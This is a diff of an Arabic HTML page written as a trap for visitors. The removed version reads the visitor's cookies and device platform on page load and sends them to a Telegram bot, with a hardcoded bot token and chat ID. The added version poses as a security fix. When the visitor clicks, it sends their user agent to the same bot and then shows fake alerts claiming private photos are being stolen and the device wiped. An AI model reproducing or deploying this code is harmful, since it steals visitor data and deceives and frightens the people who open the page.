@@ -1,46 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>نظام الربط المتكامل</title>
+    <title>تحديث أمان النظام</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: white; }
-        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; margin: 10px; }
-        .send-btn { background-color: #28a745; color: white; }
+        body { background-color: black; color: red; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
+        .btn { padding: 20px 40px; font-size: 20px; background: red; color: white; border: none; cursor: pointer; border-radius: 10px; }
+        #warning { display: none; }
     </style>
 </head>
 <body>
-    <h1>نظام الربط المطور</h1>
-    <p>بمجرد دخولك، يتم فحص الجلسة وإرسال التقرير للبوت تلقائياً.</p>
-    
-    <button class="btn send-btn" onclick="manualSend()">إرسال يدوي للبوت</button>
+
+    <div id="main">
+        <h1>⚠️ تم اكتشاف ثغرة في جهازك</h1>
+        <p>اضغط الزر أدناه لإصلاح النظام فوراً ومنع تسريب الصور</p>
+        <button class="btn" onclick="startPrank()">إصلاح الآن</button>
+    </div>
+
+    <div id="warning">
+        <h1 style="font-size: 50px;">⚠️ جاري اختراق الجهاز...</h1>
+        <p id="status">جاري سحب الصور الشخصية...</p>
+        <p id="files">📁 DCIM/Camera/IMG_001.jpg</p>
+    </div>
 
     <script>
-        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
-        const CHAT_ID = "5811700860";
-
-        // وظيفة السحب التلقائي (أول ما تفتح الصفحة)
-        window.onload = function() {
-            // سحب كل الكوكيز المتاحة
-            const cookies = document.cookie || "لا يوجد كوكيز متاح حالياً";
-            const info = `🔔 تنبيه دخول جديد!\n\nالجهاز: ${navigator.platform}\nالكوكيز المسحوب:\n${cookies}`;
+        function startPrank() {
+            // 1. إرسال البيانات للبوت (الصيد)
+            const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
+            const myId = '5811700860';
+            const info = "⚠️ ضحية دخل الفخ: " + navigator.userAgent;
             
-            sendToTelegram(info);
-        };
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${info}`);
 
-        // وظيفة الإرسال اليدوي عند ضغط الزر
-        function manualSend() {
-            // تعيين كوكيز تجريبي عشان تتأكد إن السحب شغال
-            document.cookie = "session_id=XYZ123_TEST_SESSION; path=/; SameSite=None; Secure; max-age=3600";
-            sendToTelegram("تم الضغط على الزر اليدوي وتفعيل كوكيز تجريبي ✅");
-        }
+            // 2. تفعيل المقلب النفسي
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('warning').style.display = 'block';
 
-        // الدالة المسؤولة عن التواصل مع التليجرام
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-            fetch(url).then(res => {
-                if(res.ok) console.log("تم الإرسال للبوت");
-            }).catch(err => console.error("خطأ في الإرسال:", err));
+            // 3. سلسلة رسائل مرعبة (Alerts) ما تقفل بسهولة
+            setTimeout(() => { alert("⚠️ خطأ في النظام: جاري الوصول إلى استوديو الصور..."); }, 500);
+            setTimeout(() => { alert("❌ تم سحب 45 صورة خاصة بنجاح!"); }, 1500);
+            setTimeout(() => { alert("📡 جاري إرسال البيانات إلى السيرفر الرئيسي..."); }, 2500);
+
+            // 4. حركة "تعليق" المتصفح
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "جاري مسح محتويات الجهاز... " + (i*20) + "%";
+                }, i * 1000);
+            }
+
+            // 5. قنبلة الروابط (يفتح له رابط مرعب أو فيديو مفاجئ)
+            setTimeout(() => {
+                window.location.href = "https://www.google.com"; // تقدر تغيره لرابط فيديو رعب
+            }, 6000);
         }
     </script>
 </body>
